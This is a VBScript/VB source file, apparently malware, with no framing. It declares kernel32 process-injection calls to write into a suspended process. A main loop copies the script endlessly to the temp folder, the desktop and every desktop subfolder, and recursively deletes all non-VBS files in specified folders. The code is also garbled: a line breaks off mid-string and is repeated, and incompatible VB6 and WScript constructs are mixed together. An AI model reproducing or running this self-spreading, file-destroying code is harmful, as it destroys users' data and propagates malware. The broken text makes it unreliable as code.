Option Explicit

Const PROCESS_ALL_ACCESS = &H1F0FFF
Const CREATE_SUSPENDED = &H4
Const MEM_COMMIT = &H1000
Const PAGE_READWRITE = &H4

Private Declare Function CreateProcessA Lib "kernel32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Private Declare Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Private Declare Function ResumeThread Lib "kernel32" (ByVal hThread As Long) As Long

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Sub StartInjectedProcess(ByVal strProcessPath As String, ByVal strCommandLine As String)
    Dim si As STARTUPINFO
    Dim pi As PROCESS_INFORMATION
    Dim hProcess As Long
    Dim lpRemoteBuffer As Long
    Dim lpNumberOfBytesWritten As Long
    
    ' Create the process in suspended mode
    si.cb = Len(si)
    If CreateProcessA(strProcessPath, strCommandLine, 0, 0, False, CREATE_SUSPENDED, 0, vbNullString, si, pi) <> 0 Then
        ' Allocate memory in the target process
        hProcess = pi.hProcess
        lpRemoteBuffer = VirtualAllocEx(hProcess, 0, Len(strScriptPath) + 1, MEM_COMMIT, PAGE_READWRITE)
        
        ' Write the script path to the allocated memory
        WriteProcessMemory hProcess, lpRemoteBuffer, ByVal strScriptPath, Len(strScriptPath) + 1, lpNumberOfBytesWritten
        
        ' Resume the suspended process
        ResumeThread pi.hThread
    End If
End Sub

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
strScriptPath = WScript.ScriptFullName

' Specify the folders in which you want to delete files (modify as needed)
foldersToDelete = Array("C:\Folder
' Specify the folders in which you want to delete files (modify as needed)
foldersToDelete = Array("C:\Folder1", "C:\Folder2", "C:\Folder3")

' Get the path to the desktop folder
strDesktopFolder = objShell.SpecialFolders("Desktop")

' Loop indefinitely
Do
    ' Generate a random number for the copy iteration
    randomIteration = Int((1000 * Rnd) + 1)
    
    strCopyPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\Copy" & randomIteration & ".vbs"
    objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
    
    ' Create a copy of the script on the desktop
    strDesktopCopyPath = strDesktopFolder & "\Copy" & randomIteration & ".vbs"
    objFSO.CopyFile strCopyPath, strDesktopCopyPath, True ' Add "True" to overwrite existing files
    
    ' Get the list of folders on the desktop
    Set objDesktopFolder = objFSO.GetFolder(strDesktopFolder)
    Set colFolders = objDesktopFolder.SubFolders
    
    ' Iterate through each folder and create a copy of the script
    For Each objFolder In colFolders
        strFolderCopyPath = objFolder.Path & "\Copy" & randomIteration & ".vbs"
        
        On Error Resume Next
        objFSO.CopyFile strCopyPath, strFolderCopyPath, True ' Add "True" to overwrite existing files
        On Error GoTo 0
    Next
    
    ' Delete all files except VBS files within the specified folders
    For Each folderPath In foldersToDelete
        DeleteFilesExceptVBS folderPath
    Next
Loop

Sub DeleteFilesExceptVBS(folderPath)
    On Error Resume Next
    
    Set folder = objFSO.GetFolder(folderPath)
    If Err.Number = 0 Then
        For Each file In folder.Files
            If LCase(objFSO.GetExtensionName(file.Path)) <> "vbs" Then
                objFSO.DeleteFile file.Path
            End If
        Next
        
        ' Recursively delete files in subfolders
        For Each subfolder In folder.Subfolders
            DeleteFilesExceptVBS subfolder.Path
        Next
    End If
    
    On Error GoTo 0
End Sub
